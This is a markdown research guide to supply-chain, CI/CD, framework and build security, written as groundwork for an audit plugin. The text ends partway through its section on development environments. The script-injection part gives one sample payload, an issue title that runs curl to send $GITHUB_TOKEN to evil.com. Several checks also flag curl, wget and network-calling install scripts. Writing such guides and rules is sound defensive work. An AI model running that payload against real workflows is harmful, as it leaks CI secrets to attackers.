# Framework & Project Setup Security Best Practices

> Deep research for building a security audit plugin. Covers supply chain security, dependency management, CI/CD pipeline hardening, framework-specific configurations, build system security, package manifest security, dev environment security, and SLSA/attestation frameworks.
>
> Last updated: 2026-04-04

---

## Table of Contents

1. [Supply Chain Security](#1-supply-chain-security)
2. [Dependency Management Security](#2-dependency-management-security)
3. [CI/CD Pipeline Security](#3-cicd-pipeline-security)
4. [Framework-Specific Security Configurations](#4-framework-specific-security-configurations)
5. [Build System Security](#5-build-system-security)
6. [Package Manifest Security](#6-package-manifest-security)
7. [Development Environment Security](#7-development-environment-security)
8. [SLSA Framework and Software Attestation](#8-slsa-framework-and-software-attestation)

---

## 1. Supply Chain Security

### 1.1 Attack Vectors

#### Typosquatting
Attackers publish packages with names similar to popular ones (e.g., `crossenv` mimicking `cross-env`). In 2025-2026, this became industrialized with automated campaigns targeting hundreds of packages simultaneously.

**Audit checks:**
- Verify all dependency names against known-good package lists
- Flag recently created packages (< 30 days old) with low download counts
- Check for name similarity to popular packages (Levenshtein distance)
- Validate AI-suggested package names with `npm view <package-name>` before installation

#### Dependency Confusion
Attackers publish public packages with the same name as internal/private packages. When a package manager resolves dependencies, it may pull from the public registry instead of the private one.

**Audit checks:**
- Verify `.npmrc` has explicit registry routing for scoped packages: `@yourorg:registry=https://your-private-registry.com`
- Ensure all internal packages use scoped names (`@yourorg/package-name`)
- Check for placeholder packages published on public registries to reserve internal names
- Validate `registries` configuration in `.yarnrc.yml` or `.npmrc`

#### Malicious Package Compromise
In 2025, the threat model shifted from impersonating packages to compromising real ones. The Shai-Hulud campaign affected 20,000+ repositories and 1,700 npm package versions. The September 2025 attack impacted 200+ packages. The March 2026 Axios compromise affected a package with 100M+ weekly downloads.

**Audit checks:**
- Implement cooldown periods (7+ days) before adopting newly published versions
- Route all installs through a private registry proxy (Verdaccio, Artifactory, Nexus)
- Monitor for unusual publish patterns on critical dependencies
- Verify package provenance attestations (see Section 8)

### 1.2 Lockfile Integrity

Lockfiles (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) are a critical trust boundary. Attackers can inject malicious package references through pull requests that modify lockfiles.

**How the attack works:** If attackers update a lockfile to include a new dependency or modify the source URL of an existing package, any invocation of `npm install` fetches the malicious code. Lockfiles are the primary source of truth for dependency resolution.

**Key differences by package manager:**
- **npm and Yarn**: Vulnerable to lockfile injection (modified tarball URLs, injected dependencies)
- **pnpm**: More resistant -- does not maintain tarball source URLs in `pnpm-lock.yaml`, and refuses to install packages not in `package.json`

**Audit checks:**
- Review lockfile changes in PRs with the same rigor as source code
- Flag any lockfile change that adds new dependencies not present in `package.json`
- Flag any lockfile change that modifies tarball URLs or integrity hashes
- Use `npm ci` (not `npm install`) in CI for reproducible, lockfile-faithful builds
- Use `yarn install --frozen-lockfile` or `pnpm install --frozen-lockfile` in CI
- Run [lockfile-lint](https://github.com/lirantal/lockfile-lint) to validate lockfile integrity
- Verify integrity hashes are present for all entries

**Anti-patterns to detect:**
- CI pipelines using `npm install` instead of `npm ci`
- Missing lockfiles in the repository
- Lockfile not committed to version control
- Lockfile changes with no corresponding `package.json` changes

### 1.3 Package Provenance

npm provenance connects packages to their source code and build instructions using Sigstore for cryptographic signing.

**How it works:**
1. Build system generates OIDC token from CI provider (GitHub Actions, GitLab CI)
2. npm leverages Sigstore's public CA to issue a short-lived X.509 signing certificate
3. Provenance attestation is uploaded to Sigstore's Rekor transparency log
4. Attestation format follows SLSA specification (subject = npm package, input = source repo + commit SHA)

**Audit checks:**
- Verify provenance with `npm audit signatures`
- Check that published packages include provenance statements
- Validate repository URL in signing certificate matches expected source
- Ensure CI publishes with `--provenance` flag
- Monitor Rekor transparency log for unexpected publications

### 1.4 SBOMs (Software Bill of Materials)

Two major standards exist:
- **CycloneDX** (OWASP): Lightweight, security-focused, native VEX support for vulnerability tracking
- **SPDX** (Linux Foundation): Detailed, compliance-oriented, broader tool adoption for licensing

**Audit checks:**
- Generate SBOMs on every build (not just releases)
- Use tools compliant with CycloneDX or SPDX standards
- Sign generated SBOMs to ensure authenticity
- Ingest SBOMs into [OWASP Dependency-Track](https://dependencytrack.org/) for continuous monitoring
- Compare SBOMs against runtime scans to detect drift
- Verify SBOM-to-artifact mappings in artifact repositories
- Regenerate and diff SBOMs between releases to track dependency changes

**Primary sources:**
- [CycloneDX Authoritative Guide to SBOM (PDF)](https://cyclonedx.org/guides/OWASP_CycloneDX-Authoritative-Guide-to-SBOM-en.pdf)
- [CycloneDX Specification](https://cyclonedx.org/)
- [OWASP Advisory on SBOM Implementation](https://owasp.org/blog/2025/02/24/advisory-on-implementation-of-software-bill-of-materials-for-vulnerability-management)
- [OpenSSF on SBOMs and CRA](https://openssf.org/blog/2025/10/22/sboms-in-the-era-of-the-cra-toward-a-unified-and-actionable-framework/)

---

## 2. Dependency Management Security

### 2.1 Pinning Strategies

| Strategy | Pros | Cons |
|----------|------|------|
| Exact pinning (`1.2.3`) | Reproducible, immune to malicious updates | Manual update burden |
| Range pinning (`^1.2.3`) | Auto-receives patches | Vulnerable to compromised patch releases |
| Lockfile-only | Balances flexibility with reproducibility | Requires `npm ci` discipline |
| Hash pinning (`integrity: sha512-...`) | Cryptographic guarantee of exact content | Complex to maintain |

**Recommendations:**
- Use exact versions in `package.json` for production applications
- Always commit and enforce lockfiles
- Use hash verification: `npm ci` validates integrity hashes in lockfile
- For Python: use `pip compile` with `--generate-hashes` for hash-pinned requirements
- For GitHub Actions: pin to full commit SHAs, never tags

### 2.2 Lockfile Auditing

**Tools:**
- [lockfile-lint](https://github.com/lirantal/lockfile-lint): Validates lockfile integrity, detects URL tampering
- `npm ci`: Refuses to proceed if lockfile doesn't match `package.json`
- `yarn install --check-files`: Verifies installed files match lockfile

**CI integration pattern:**
```yaml
# In CI pipeline - always use ci command, never install
- run: npm ci --ignore-scripts
- run: npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm --validate-https
```

### 2.3 Automated Vulnerability Scanning

#### npm audit
- Built into npm CLI; scans `node_modules` against GitHub Advisory Database
- Run: `npm audit` (report) or `npm audit fix` (auto-remediate)
- Limitations: only covers npm ecosystem, can produce noise from dev dependencies
- Use `npm audit --omit=dev` to focus on production dependencies

#### pip-audit
- Maintained by Trail of Bits with Google support
- Scans Python environments against [PyPI Advisory Database](https://github.com/pypa/advisory-database)
- Supports multiple output formats (JSON, SARIF) for CI integration
- Automated remediation with `--fix` flag
- Limitations: cannot detect malicious packages, only known vulnerabilities
- **Best practice**: combine with hashed requirements (`pip compile --generate-hashes`)

#### Dependabot (GitHub)
- Built into GitHub, free, covers 30+ ecosystems
- Pulls from GitHub Advisory Database (23,000+ reviewed advisories)
- Low false positives due to GitHub security team review
- Limited customization, no automerge built-in, no config sharing across repos
- Best for: GitHub-only teams wanting minimal setup

#### Renovate
- Cross-platform (GitHub, GitLab, Bitbucket), 90+ package managers
- Built-in automerge, preset system for org-wide config sharing
- Centralized dependency dashboard
- Steeper learning curve, but far more flexible
- Best for: organizations with monorepos, multiple platforms, or complex dependency management

#### Socket.dev
- AI-powered behavioral analysis; detects malicious packages within minutes of publication
- Blocks PRs introducing suspicious packages (GitHub App)
- CLI flags risky behavior during installation
- Browser extension provides real-time alerts on package pages
- Caught North Korea-linked campaigns, the Axios compromise, and 500+ malicious packages in September 2025

**Recommended scanning stack (layered):**
```
Socket.dev          → Malicious package detection (behavioral)
Dependabot/Renovate → Known vulnerability alerts + auto-update PRs
npm audit / pip-audit → Per-build vulnerability scanning in CI
lockfile-lint        → Lockfile integrity validation
```

### 2.4 License Compliance Risks

License violations can create legal liability. Common issues:
- GPL-licensed dependencies in proprietary software (copyleft contamination)
- AGPL dependencies in SaaS products
- License changes in dependency updates (bait-and-switch)

**Audit checks:**
- Scan all dependencies for license compatibility with `license-checker` (npm) or `pip-licenses` (Python)
- Block disallowed licenses in CI pipeline
- Monitor for license changes in dependency updates
- Generate SPDX SBOMs with license metadata
- Maintain an approved/denied license list for the organization

**Primary sources:**
- [OWASP NPM Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)
- [OpenSSF Best Practices for Developers](https://best.openssf.org/developers.html)
- [npm Security Best Practices (Liran Tal)](https://github.com/lirantal/npm-security-best-practices)
- [Socket.dev Threat Reports](https://socket.dev/blog)
- [Snyk NPM Security Best Practices](https://snyk.io/articles/npm-security-best-practices-shai-hulud-attack/)
- [pip-audit on PyPI](https://pypi.org/project/pip-audit/)
- [Renovate Documentation](https://docs.renovatebot.com/)

---

## 3. CI/CD Pipeline Security

### 3.1 OWASP Top 10 CI/CD Security Risks

| ID | Risk | Description |
|----|------|-------------|
| CICD-SEC-1 | Insufficient Flow Control Mechanisms | Inadequate controls governing code movement through pipelines |
| CICD-SEC-2 | Inadequate Identity and Access Management | IAM systems lack proper verification and authorization |
| CICD-SEC-3 | Dependency Chain Abuse | Exploiting vulnerabilities in external code dependencies |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) | Malicious code injection into pipeline execution |
| CICD-SEC-5 | Insufficient PBAC | Weak pipeline-based access controls |
| CICD-SEC-6 | Insufficient Credential Hygiene | Poor secrets and credential management |
| CICD-SEC-7 | Insecure System Configuration | CI/CD infrastructure misconfigurations |
| CICD-SEC-8 | Ungoverned Usage of 3rd Party Services | Uncontrolled external tool integration |
| CICD-SEC-9 | Improper Artifact Integrity Validation | Build outputs lack authenticity verification |
| CICD-SEC-10 | Insufficient Logging and Visibility | Inadequate monitoring for suspicious activities |

### 3.2 Secrets in CI

#### GitHub Actions Secrets
- Use GitHub Secrets (encrypted at rest, masked in logs)
- Never pass secrets via command-line arguments (visible in process listings)
- Never echo or log secret values
- Use `${{ secrets.NAME }}` syntax -- never hardcode
- Rotate secrets regularly

#### Vault Integration
- Use HashiCorp Vault or cloud-native secret managers (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault)
- Prefer dynamic secrets (short-lived, auto-rotated)
- Use AppRole or OIDC for authentication from CI

**Anti-patterns to detect:**
- Secrets in environment variables in workflow files (not using GitHub Secrets)
- Secrets passed as command-line arguments
- `echo` or `cat` of secret values in workflow steps
- Overly broad secret scopes (org-level when repo-level suffices)
- Long-lived API keys or service account keys stored as secrets

### 3.3 Pipeline Injection Attacks

#### Script Injection in GitHub Actions

User-controlled contexts that are vulnerable to injection:

> Contexts ending in: `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref`, `title`

Examples: `github.event.issue.title`, `github.event.pull_request.body`, `github.event.comment.body`

**Vulnerable pattern:**
```yaml
# DANGEROUS - direct interpolation of user input
- run: echo "Title: ${{ github.event.issue.title }}"
```

An attacker can set the issue title to `"; curl http://evil.com/steal?token=$GITHUB_TOKEN; echo "` to exfiltrate secrets.

**Safe pattern:**
```yaml
# SAFE - use intermediate environment variable
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

**Even safer - use a JavaScript action** that processes the context value as an argument rather than inline script interpolation.

#### PR-Based Attacks

**`pull_request_target` dangers:**
- Runs in the context of the target/base repository (not the fork)
- Has access to repository secrets and write permissions
- NEVER check out the PR's code when using this trigger
- Malicious contributors can inject arbitrary code execution

**Audit checks:**
- Flag workflows using `pull_request_target` that also checkout PR code
- Flag direct interpolation of `github.event.*` contexts in `run:` steps
- Ensure all workflow triggers are appropriate (avoid `workflow_dispatch` without input validation)

#### Real-World Incidents (2025)
- **tj-actions/changed-files** (CVE-2025-30066): Compromised action exfiltrated secrets from CI runners
- **reviewdog/action-setup**: Compromised CI action injected malicious code
- **GhostAction** (Sep 2025): Hijacked 327 accounts, stole 3,325 secrets from 817 repos
- **Shai Hulud v2** (Nov 2025): Infected 20,000+ repos and 1,700 npm versions
- **Gluestack** (Jun 2025): Command injection through discussion page input, compromised 17 npm packages

### 3.4 Runner Security

**GitHub-hosted runners:**
- Use for public repositories (always)
- Fresh VM per job, destroyed after completion
- No persistent state between runs

**Self-hosted runners:**
- NEVER use for public repositories (untrusted code from forks can execute)
- Execute under unprivileged accounts (no admin/root)
- Implement ephemeral, isolated workloads (containers, Kubernetes pods)
- Deploy EDR agents and logging
- Restrict sudo access
- Use runner groups to limit which repos can use which runners

### 3.5 Artifact Signing

- Sign build artifacts using Sigstore/cosign
- Verify signatures before deployment
- Store signatures alongside artifacts or in transparency logs
- Use admission controllers in Kubernetes to enforce signature verification

### 3.6 OIDC for CI (Keyless Authentication)

Replace long-lived cloud credentials with OIDC-based short-lived tokens:

**How it works:**
1. GitHub's OIDC provider generates a JWT for each job run
2. JWT contains claims about the workflow (repo, branch, environment, actor)
3. Cloud provider validates the JWT against GitHub's OIDC endpoint
4. Cloud provider issues short-lived credentials (typically 1 hour)

**Supported cloud providers:**
- **AWS**: IAM OIDC identity provider + role assumption
- **GCP**: Workload Identity Federation + service account impersonation
- **Azure**: Federated credentials on app registrations
- **HashiCorp Vault**: JWT/OIDC auth backend

**Audit checks:**
- Flag any long-lived cloud credentials (AWS access keys, GCP service account keys) stored as GitHub Secrets
- Verify OIDC subject claims are scoped to specific repos/branches/environments
- Ensure Workload Identity Pools use attribute conditions to restrict access
- Check that cloud IAM roles follow least privilege

### 3.7 GitHub Actions Hardening Checklist

```yaml
# Set restrictive default permissions
permissions:
  contents: read

# Pin actions to full commit SHAs
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0

# Use OIDC instead of static credentials
- uses: aws-actions/configure-aws-credentials@...
  with:
    role-to-assume: arn:aws:iam::123456789012:role/my-role
    aws-region: us-east-1

# Use environment variables for untrusted input
- run: echo "Processing issue"
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
```

**Primary sources:**
- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [GitHub Docs: Script Injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- [GitHub Docs: Secure Use Reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [GitHub Docs: OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect)
- [GitGuardian GitHub Actions Security Cheat Sheet](https://blog.gitguardian.com/github-actions-security-cheat-sheet/)
- [OpenSSF: Securing CI/CD After tj-actions](https://openssf.org/blog/2025/06/11/maintainers-guide-securing-ci-cd-pipelines-after-the-tj-actions-and-reviewdog-supply-chain-attacks/)
- [Wiz: GitHub Actions Security Guide](https://www.wiz.io/blog/github-actions-security-guide)
- [Arctiq: Top 10 GitHub Actions Security Pitfalls](https://arctiq.com/blog/top-10-github-actions-security-pitfalls-the-ultimate-guide-to-bulletproof-workflows)

---

## 4. Framework-Specific Security Configurations

### 4.1 Express.js

#### Helmet (HTTP Security Headers)
```javascript
const helmet = require('helmet');
app.use(helmet());
```

Helmet sets 13+ security headers by default:
- `Content-Security-Policy`: Controls resource loading origins
- `Strict-Transport-Security`: Enforces HTTPS (HSTS)
- `X-Content-Type-Options: nosniff`: Prevents MIME sniffing
- `X-Frame-Options: SAMEORIGIN`: Prevents clickjacking
- `Cross-Origin-Opener-Policy`
- `Cross-Origin-Resource-Policy`
- `Origin-Agent-Cluster`

**Audit checks:**
- Verify Helmet is installed and applied early in middleware stack
- Check CSP is customized (not just defaults) when using third-party scripts/CDNs
- Verify HSTS is enabled for HTTPS domains
- Ensure `X-Powered-By` header is disabled: `app.disable('x-powered-by')`

#### CORS Configuration
```javascript
const cors = require('cors');
app.use(cors({
  origin: ['https://trusted-domain.com'],  // NEVER use '*' in production
  methods: ['GET', 'POST'],
  credentials: true
}));
```

**Anti-patterns to detect:**
- `origin: '*'` in production (allows any origin)
- `origin: true` (reflects any requesting origin, effectively `*` with credentials)
- Missing CORS configuration entirely (defaults may be too permissive)
- CORS applied after routes (never takes effect)

#### Rate Limiting
```javascript
const rateLimit = require('express-rate-limit');

// Global limiter
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));

// Strict auth limiter
app.use('/api/auth', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));
```

**Audit checks:**
- Verify rate limiting is applied globally and with stricter limits on auth endpoints
- Check that production uses a shared store (Redis) for rate limiting across instances
- Verify rate limit headers are not leaking internal configuration

#### Additional Express Security
- **Cookie security**: Set `secure: true`, `httpOnly: true`, `sameSite: 'strict'`
- **Session names**: Change default session cookie name from `connect.sid`
- **Input validation**: Sanitize all user input; validate URLs before `res.redirect()`
- **Error handling**: Custom 404/500 handlers that don't leak stack traces
- **TLS**: Use HTTPS in production (terminate at Nginx/load balancer)

### 4.2 Next.js

#### Content Security Policy (CSP)

**Middleware approach (recommended for nonce-based CSP):**
```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' blob: data:;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `;
  // ... set header and pass nonce
}
```

**next.config.js approach (static CSP):**
```javascript
const securityHeaders = [
  { key: 'Content-Security-Policy', value: "default-src 'self'; ..." },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
];
```

**Audit checks:**
- Verify CSP headers are set (not just meta tags -- headers are enforced earlier)
- Check that `'unsafe-inline'` and `'unsafe-eval'` are NOT used in script-src
- For Next.js 15+ App Router: verify CSP-dependent pages use `export const dynamic = 'force-dynamic'` to sync nonces
- Verify nonces are regenerated per-request (not static)
- Check that `X-Frame-Options`, `X-Content-Type-Options`, and `Referrer-Policy` are set

#### Server Actions Security
- Server Actions execute on the server but can be called from the client
- Validate all inputs in Server Actions (they are publicly callable endpoints)
- Use authentication/authorization checks within each Server Action
- Never trust client-side state passed to Server Actions
- Rate-limit Server Action endpoints

**Anti-patterns to detect:**
- Server Actions without input validation
- Server Actions without authentication checks
- CSP headers missing entirely
- `'unsafe-inline'` or `'unsafe-eval'` in CSP directives
- Source maps served in production (see Section 5)

### 4.3 NestJS

#### Guards, Pipes, and Validation

**Global ValidationPipe (critical security configuration):**
```typescript
app.useGlobalPipes(new ValidationPipe({
  transform: true,           // Auto-transform to DTO instances
  whitelist: true,           // Strip non-whitelisted properties
  forbidNonWhitelisted: true, // Reject requests with extra properties
  forbidUnknownValues: true,  // Reject unknown values
  disableErrorMessages: true, // Don't leak validation details in production
}));
```

**DTO pattern with class-validator:**
```typescript
import { IsString, IsEmail, MinLength, MaxLength } from 'class-validator';

export class CreateUserDto {
  @IsString()
  @MinLength(2)
  @MaxLength(50)
  name: string;

  @IsEmail()
  email: string;

  @IsString()
  @MinLength(8)
  password: string;
}
```

**Audit checks:**
- Verify global `ValidationPipe` is configured with `whitelist: true` and `forbidNonWhitelisted: true`
- Check that all DTOs use class-validator decorators
- Verify guards are applied to all routes requiring authentication
- Check that `disableErrorMessages` is true in production (prevents information leakage)
- Verify rate limiting is implemented (`@nestjs/throttler`)
- Check CORS configuration in `main.ts`

**Anti-patterns to detect:**
- Missing global `ValidationPipe`
- `whitelist: false` or missing (allows property injection)
- Endpoints without authentication guards
- Raw request body used without DTO validation
- Error messages enabled in production revealing validation rules

### 4.4 Django

#### Deployment Checklist

Run automated checks: `manage.py check --deploy`

**Critical settings:**

| Setting | Required Value | Risk if Misconfigured |
|---------|---------------|----------------------|
| `DEBUG` | `False` | Leaks source code, settings, local variables |
| `SECRET_KEY` | 50+ char random value, from env | Session forgery, CSRF bypass |
| `ALLOWED_HOSTS` | Explicit list | CSRF attacks, host header injection |
| `CSRF_COOKIE_SECURE` | `True` | CSRF token sent over HTTP |
| `SESSION_COOKIE_SECURE` | `True` | Session cookie sent over HTTP |
| `SECURE_SSL_REDIRECT` | `True` | HTTP traffic not redirected to HTTPS |
| `SECURE_HSTS_SECONDS` | `31536000` (1 year) | Browsers don't enforce HTTPS |
| `SECURE_CONTENT_TYPE_NOSNIFF` | `True` | MIME sniffing attacks |
| `X_FRAME_OPTIONS` | `'DENY'` | Clickjacking |

**Middleware order (security-relevant):**
```python
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',        # Must be first
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    # ... other middleware
]
```

**Audit checks:**
- Run `manage.py check --deploy` and verify zero warnings
- Verify `SECRET_KEY` is loaded from environment variable, not hardcoded
- Check `SECRET_KEY` is not prefixed with `'django-insecure-'`
- Verify `DEBUG = False` in production settings
- Check `ALLOWED_HOSTS` is not empty or `['*']`
- Verify CSRF template tag `{% csrf_token %}` is present in all forms
- Check admin URL is changed from default `/admin/`
- Verify CSP implementation (requires `django-csp` third-party package)
- Verify `@login_required` decorator on protected views
- Check password validators are configured

**Anti-patterns to detect:**
- `DEBUG = True` in production
- Hardcoded `SECRET_KEY` in settings files committed to version control
- `ALLOWED_HOSTS = ['*']`
- Missing `CSRF_COOKIE_SECURE` or `SESSION_COOKIE_SECURE`
- Default admin URL `/admin/`
- `@csrf_exempt` decorator on views without strong justification
- Missing `SECURE_SSL_REDIRECT`

### 4.5 Spring Boot

#### Security Auto-Configuration

When Spring Security is on the classpath:
- All actuator endpoints except `/health` and `/info` are secured by default
- CSRF protection is enabled by default
- Form login and HTTP Basic are auto-configured

**Audit checks:**
- Verify Spring Security dependency is present
- Check that custom `WebSecurityConfigurerAdapter` doesn't disable CSRF
- Verify actuator endpoints are properly secured (not exposed to public)
- Check `management.endpoints.web.exposure.include` is limited (not `*`)
- Verify `management.server.port` uses a different port from application
- Check that production profiles don't disable security features

**Critical configuration:**
```yaml
# application-prod.yml
management:
  endpoints:
    web:
      exposure:
        include: health,info  # Only expose necessary endpoints
  server:
    port: 8081  # Separate port for actuator

spring:
  security:
    # Never disable CSRF in production
    # Validate that custom SecurityFilterChain doesn't call .csrf().disable()
```

**Anti-patterns to detect:**
- `.csrf(csrf -> csrf.disable())` in production SecurityFilterChain
- `management.endpoints.web.exposure.include=*` (exposes all actuator endpoints)
- Actuator on same port as application without authentication
- Missing `@PreAuthorize` or `@Secured` on controller methods
- Default credentials not changed (`spring.security.user.password`)
- H2 console enabled in production (`spring.h2.console.enabled=true`)

**Primary sources:**
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Helmet.js](https://github.com/helmetjs/helmet)
- [Next.js CSP Guide](https://nextjs.org/docs/pages/guides/content-security-policy)
- [NestJS Validation](https://docs.nestjs.com/techniques/validation)
- [Django Deployment Checklist](https://docs.djangoproject.com/en/6.0/howto/deployment/checklist/)
- [OWASP Django Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Django_Security_Cheat_Sheet.html)
- [Spring Security CSRF](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html)
- [Spring Boot Actuator Security](https://rwinch.github.io/spring-boot/actuator/endpoints/security.html)

---

## 5. Build System Security

### 5.1 Reproducible Builds

Reproducible builds ensure that identical source code always produces identical binary output, allowing independent verification of build integrity.

**Audit checks:**
- Verify lockfiles are committed and `npm ci` / `pip install --require-hashes` is used in builds
- Check for non-deterministic build inputs (timestamps, random values, file ordering)
- Verify build environment is containerized and version-pinned
- Check that build outputs can be independently reproduced
- Validate build toolchain versions are pinned (Node.js, Python, etc.)

### 5.2 Webpack/Vite Configuration Security

#### Source Maps in Production

Source maps become a security risk when publicly exposed because they reveal:
- Full application source code and logic
- Internal API endpoints and routing
- Hardcoded secrets (API keys, tokens)
- Business logic and algorithms

**Safe configuration for Vite:**
```javascript
// vite.config.js
export default defineConfig({
  build: {
    sourcemap: 'hidden',  // Generate maps but don't reference in bundles
  }
});
// Upload hidden source maps to error tracking (Sentry) only
```

**Safe configuration for Webpack:**
```javascript
// webpack.config.js
module.exports = {
  devtool: 'hidden-source-map',  // Generate without public reference
};
```

**Audit checks:**
- Verify `sourcemap: true` is NOT used in production builds (exposes via `//# sourceMappingURL`)
- Check deployed assets for `.map` files accessible via HTTP
- Check for `//# sourceMappingURL=` comments in production bundles
- If source maps are needed for error tracking, verify `hidden` or `hidden-source-map` is used
- Verify source maps are uploaded to error tracking service (Sentry), not deployed to web servers

#### Public Path Injection

**Audit checks:**
- Verify `publicPath` / `base` is not user-controllable
- Check that `__webpack_public_path__` is not set from user input
- Validate CDN URLs in build config are hardcoded, not from environment variables that could be tampered

### 5.3 Environment Variable Handling During Build

**Vite-specific:**
- Only `VITE_*` prefixed variables are exposed to client-side code
- `VITE_*` variables are statically replaced at build time (string substitution into source)
- **NEVER put secrets in `VITE_*` variables** -- they become part of the client bundle

**Next.js-specific:**
- Only `NEXT_PUBLIC_*` prefixed variables are exposed to client-side code
- Same risk as Vite: these are baked into the bundle at build time

**Audit checks:**
- Search for secrets (API keys, tokens, passwords) in `VITE_*` or `NEXT_PUBLIC_*` variables
- Verify `.env.production` does not contain secrets meant to be server-only
- Check that server-only environment variables (database URLs, API secrets) do NOT have the public prefix
- Verify `.env` files are in `.gitignore`
- Check for `process.env` usage that might leak server variables to client bundles

**Anti-patterns to detect:**
- `VITE_API_SECRET=sk_live_xxx` (secret in client-exposed variable)
- `NEXT_PUBLIC_DATABASE_URL=...` (server secret with public prefix)
- `.env` files committed to version control
- Build scripts that `echo` environment variables to logs
- Hardcoded secrets in build configuration files

**Primary sources:**
- [Vite: Env Variables and Modes](https://vite.dev/guide/env-and-mode)
- [Vite: Build Options](https://vite.dev/config/build-options)
- [web.dev: Source Maps](https://web.dev/articles/source-maps)
- [CyberSierra: Source Map Secret Leaking](https://cybersierra.co/blog/secure-react-source-maps/)

---

## 6. Package Manifest Security

### 6.1 Lifecycle Script Attacks (postinstall)

npm lifecycle hooks (`preinstall`, `install`, `postinstall`, `prepare`) execute arbitrary code during `npm install`. This is the primary attack vector for malicious npm packages.

**Real-world examples:**
- `crossenv` (typosquat of `cross-env`): Malicious `postinstall` script stole environment variables
- `eslint-scope` incident: Harvested npm tokens via lifecycle hooks
- **Shai-Hulud campaign (Sep 2025)**: Tampered versions of `ngx-bootstrap`, `ng2-file-upload`, `@ctrl/tinycolor` used `postinstall` hooks to pull obfuscated `bundle.js` that harvested npm, GitHub, and cloud credentials

**Mitigation - disable scripts globally:**
```ini
# .npmrc
ignore-scripts=true
```

Or per-install:
```bash
npm install --ignore-scripts
npm ci --ignore-scripts
```

**Selective allowlisting:**
Use [@lavamoat/allow-scripts](https://github.com/LavaMoat/LavaMoat/tree/main/packages/allow-scripts) to allowlist specific packages that legitimately need lifecycle scripts:
```json
// package.json
{
  "lavamoat": {
    "allowScripts": {
      "esbuild": true,
      "sharp": true
    }
  }
}
```

**Audit checks:**
- Check `.npmrc` for `ignore-scripts=true`
- If ignore-scripts is not set, audit all `postinstall`, `preinstall`, and `install` scripts in `node_modules/*/package.json`
- Flag any dependency with lifecycle scripts that execute network requests, access the filesystem outside its own directory, or spawn child processes
- Verify CI pipelines use `--ignore-scripts` flag
- Check for `@lavamoat/allow-scripts` or equivalent allowlisting

### 6.2 package.json Scripts Section

**Audit checks:**
- Review all scripts in `package.json` for commands that could be dangerous
- Flag scripts that use `curl`, `wget`, or other network commands
- Flag scripts that execute arbitrary files from node_modules (could change with dependency updates)
- Verify `prepublishOnly` and `prepare` scripts don't accidentally include sensitive files

### 6.3 .npmrc / .pypirc Security

**.npmrc risks:**
- Can contain authentication tokens (`//registry.npmjs.org/:_authToken=...`)
- Can redirect package resolution to untrusted registries
- Can disable security features (`strict-ssl=false`)

**.pypirc risks:**
- Contains PyPI credentials in plaintext
- Should never be committed to version control

**Audit checks:**
- Verify `.npmrc` is in `.gitignore` (or at minimum, the project `.npmrc` doesn't contain tokens)
- Check for `strict-ssl=false` in `.npmrc` (disables TLS verification)
- Check for `registry=` pointing to unexpected URLs
- Verify `.pypirc` is in `.gitignore`
- Check that CI uses environment-based token injection, not committed credential files
- Scan git history for accidentally committed `.npmrc` or `.pypirc` with tokens

**Anti-patterns to detect:**
- Auth tokens in committed `.npmrc`
- `strict-ssl=false` in `.npmrc`
- Custom registry URLs without justification
- `.pypirc` committed to repository
- Credentials in `pip.conf` or `pip.ini`

**Primary sources:**
- [OWASP NPM Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)
- [Node.js Security: npm ignore-scripts](https://www.nodejs-security.com/blog/npm-ignore-scripts-best-practices-as-security-mitigation-for-malicious-packages)
- [npm Docs: Scripts](https://docs.npmjs.com/cli/v11/using-npm/scripts/)
- [Snyk: NPM Security After Shai Hulud](https://snyk.io/articles/npm-security-best-practices-shai-hulud-attack/)

---

## 7. Development Environment Security

### 7.1 IDE Extension Supply Chain

VS Code extension attacks escalated dramatically in 2025:
- Detections grew from 27 (2024) to 105+ (first 10 months of 2025)
- 100+ extensions leaked access tokens in October 2025, enabling attackers to push malicious updates
- TigerJack campaign embedded spyware, crypto miners, and backdoors in 11+ extensions (17,000+ developer installs)
- Fake `prettier-vscode-plus` extension deployed multi-stage malware chain (Anivia loader + OctoRAT)
- 4 extensions with 125M+ combined installs found to have critical flaws (February 2026)

**Why developers are targeted:** Developers run with elevated privileges, hold access tokens for package registries and source repositories, making a compromised IDE a high-leverage entry point for credential theft, lateral movement, or supply chain compromise.

**Audit checks:**
- Review installed VS Code extensions periodically
- Prefer extensions from verified publishers
